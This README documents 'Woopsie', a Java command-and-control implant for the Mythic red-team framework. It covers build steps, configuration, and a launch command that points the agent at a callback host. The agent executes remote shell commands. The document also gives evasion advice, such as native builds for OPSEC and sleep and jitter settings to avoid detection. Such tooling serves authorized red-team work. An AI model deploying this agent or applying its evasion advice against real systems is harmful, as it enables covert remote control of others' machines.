<p align="center">
  <img alt="Woopsie Logo" src="agent_icons/woopsie.svg" height="25%" width="25%">
</p>

# Woopsie

Woopsie is a cross-platform Command & Control (C2) agent for the Mythic framework, written in Java. It supports both JAR and native executable compilation using GraalVM Native Image.

## Features

- **Cross-Platform**: Works on Windows, Linux, and macOS
- **Dual Build Modes**:
  - **JAR**: Traditional Java bytecode requiring JVM (portable, all platforms)
  - **Native**: GraalVM Native Image compilation (no JVM required, Linux-only currently)
- **HTTP/HTTPS Communication**: Built-in support for HTTP and HTTPS C2 protocols
- **Mythic Integration**: Full integration with Mythic C2 framework
- **Task Execution**: Extensible task framework with built-in commands

## Build Modes

### JAR Build (Recommended for Windows/macOS)
- Output: `woopsie.jar` (~5.2MB with all dependencies)
- Requires: Java 17+ JVM on target system
- Benefits: Works on all platforms, smaller build times, easier debugging
- Drawbacks: Requires JVM installation on target

### Native Build (Linux Only)
- Output: `woopsie` native executable
- Requires: GraalVM Native Image toolchain
- Benefits: No JVM required, smaller runtime footprint, better OPSEC
- Drawbacks: Currently Linux-only, longer build times (~2-5 minutes)

## Quick Start

### Building Locally

**JAR Build:**
```bash
cd Payload_Type/woopsie/agent_code
mvn clean package
# Output: target/woopsie.jar
java -jar target/woopsie.jar <callback_host> <callback_port> <sleep_interval>
```

**Native Build (Linux only):**
```bash
# Requires GraalVM with native-image installed
cd Payload_Type/woopsie/agent_code
mvn clean package -Pnative
# Output: target/woopsie
./target/woopsie <callback_host> <callback_port> <sleep_interval>
```

### Building with Mythic

1. Install woopsie in Mythic:
```bash
cd /path/to/Mythic
sudo ./mythic-cli install github https://github.com/yourusername/woopsie
```

2. Create payload via Mythic UI:
   - Select "woopsie" payload type
   - Choose output format: "jar" or "native"
   - Configure C2 profile (HTTP/HTTPS)
   - Set callback host, port, sleep interval

3. Download and deploy payload

## Architecture

```
Payload_Type/woopsie/
├── agent_code/                  # Java agent source
│   ├── src/main/java/com/woopsie/
│   │   ├── Agent.java          # Main agent loop
│   │   ├── Config.java         # Configuration management
│   │   ├── TaskManager.java    # Task dispatcher
│   │   ├── CommunicationHandler.java # C2 communication
│   │   └── PayloadVars.java    # Build-time injection (generated)
│   ├── src/main/resources/
│   │   ├── logback.xml         # Logging configuration
│   │   └── META-INF/native-image/  # GraalVM config
│   └── pom.xml                 # Maven build configuration
├── woopsie/mythic/
│   └── agent_functions/
│       └── builder.py          # Mythic payload builder
├── Dockerfile                  # Builder container (GraalVM 21)
├── main.py                     # Mythic service entry point
└── requirements.txt            # Python dependencies
```

## Core Components

### Agent.java
Main agent with C2 loop. Initializes configuration, establishes C2 connection, polls for tasks, executes them, and sends results.

### Config.java
Configuration management using build-time injected `PayloadVars.java` or command-line arguments for development.

### TaskManager.java
Task execution framework with built-in commands:
- `shell <command>`: Execute shell command
- `pwd`: Get current working directory
- `exit`: Terminate agent

### CommunicationHandler.java
HTTP/HTTPS communication handler for C2 interaction (checkin, task retrieval, result submission).

### builder.py
Mythic payload builder that generates `PayloadVars.java` with C2 configuration and builds JAR or native executable.

## Dependencies

### Runtime
- Jackson 2.18.2: JSON processing
- Apache HttpClient 5.4.1: HTTP/HTTPS communication
- Logback 1.5.16 + SLF4J 2.0.16: Logging

### Build Tools
- Java 17 (development)
- Maven 3.8+
- GraalVM 21 (for native builds)
- Docker (for Mythic integration)

## Configuration

Build-time (via Mythic):
- `CALLBACK_HOST`: C2 server hostname/IP
- `CALLBACK_PORT`: C2 server port
- `GET_URI`: Task retrieval URI (default: `/api/v1/tasks`)
- `POST_URI`: Result submission URI (default: `/api/v1/results`)
- `CALLBACK_INTERVAL`: Sleep interval in seconds
- `CALLBACK_JITTER`: Jitter percentage (0-100)
- `USER_AGENT`: HTTP User-Agent header

Development fallback (command-line):
```bash
java -jar woopsie.jar <host> <port> <interval>
```

## GraalVM Native Image

Native builds require reflection/resource configuration in `src/main/resources/META-INF/native-image/`:
- `reflect-config.json`: Classes using reflection (Agent, Config, TaskManager, etc.)
- `resource-config.json`: Resources to include (logback.xml, properties)
- `serialization-config.json`: Classes requiring serialization

### Windows Native Builds
Windows cross-compilation from Linux is not yet supported. Use JAR format for Windows targets or build on a Windows host.

## Current Task Implementations

✅ Implemented:
- `shell <command>`: Execute shell command
- `pwd`: Get current working directory
- `exit`: Terminate agent

📋 TODO:
- File operations: `ls`, `cat`, `cd`, `upload`, `download`
- Process management: `ps`, `kill`
- Configuration: `sleep`, `jitter`

## Troubleshooting

### Native Build Fails
- Verify GraalVM installation: `native-image --version`
- Check reflection config includes all dynamic classes
- Try verbose build: `mvn -Pnative package -X`

### ClassNotFoundException at Runtime (Native)
- Missing class in `reflect-config.json`
- Use GraalVM tracing agent to capture reflection usage:
```bash
java -agentlib:native-image-agent=config-output-dir=src/main/resources/META-INF/native-image \
     -jar target/woopsie.jar
```

### Agent Fails to Connect
- Verify callback host/port
- Check firewall rules
- Enable debug logging in `logback.xml`
- Test connectivity: `curl http://callback_host:port/get_uri`

## Security Considerations

- Native builds have better OPSEC (no visible Java dependencies)
- Payloads contain embedded C2 configuration
- Customize User-Agent for target environment
- Use appropriate sleep interval and jitter to avoid detection
- Current implementation relies on Mythic's `mythic_encrypts` flag

## Development

Requirements:
- Java 17 or later
- Apache Maven 3.8+
- Mythic framework 3.4.6+
- GraalVM 21+ (for native builds)

## License

See LICENSE file for details.

## Credits

- Author: @haha150
- Framework: [Mythic C2](https://github.com/its-a-feature/Mythic)
- GraalVM: [Oracle GraalVM](https://www.graalvm.org/)
